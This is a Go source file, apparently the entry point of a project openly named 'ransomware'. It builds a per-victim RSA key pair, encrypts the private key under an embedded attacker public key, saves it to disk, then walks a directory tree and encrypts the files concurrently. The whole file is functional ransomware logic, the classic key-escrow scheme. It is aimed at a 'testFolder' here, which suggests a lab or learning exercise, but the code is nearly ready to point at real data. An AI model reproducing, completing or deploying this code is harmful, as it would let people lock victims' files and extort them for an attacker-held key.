package main

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"io/fs"
	"os"
	"path/filepath"
	enc "ransomware/encryption"
	"ransomware/io"
	"ransomware/utils"
	"sync"
)

var (
	filesToVisit = make(chan io.File)
	waitGroup    sync.WaitGroup
	sPubKey      = io.DecodePublicKey(utils.SPubKeyPem)
)

func main() {

	currentDirectory, _ := os.Getwd()

	cPubKey, err := generateClientKeys(sPubKey)
	if err != nil {
		panic(err)
	}

	encryptFiles(string(currentDirectory+"/testFolder"), cPubKey)
}

func generateClientKeys(servPubKey *rsa.PublicKey) (*rsa.PublicKey, error) {
	cPrivKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	cPubKey := &(cPrivKey.PublicKey)

	privBytes := x509.MarshalPKCS1PrivateKey(cPrivKey)
	privBytesEncrypted, err := enc.Encrypt(privBytes, servPubKey)
	if err != nil {
		return nil, err
	}

	keyFile, err := os.Create("cPrivateKey.encrypted")
	if err != nil {
		return nil, err
	}
	_, err = keyFile.Write(privBytesEncrypted)
	if err != nil {
		return nil, err
	}

	return cPubKey, nil
}

func encryptFiles(dirPath string, cPubKey *rsa.PublicKey) {

	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

			if d.IsDir() {

				if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
					return filepath.SkipDir
				}
			}

			if !d.IsDir() {
				info, err := d.Info()
				if err != nil {
					return err
				}

				filesToVisit <- io.File{Info: info, Path: path, Extension: ""}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {
			file.Encrypt(cPubKey)
		}
		defer waitGroup.Done()
	}()

	waitGroup.Wait()
}
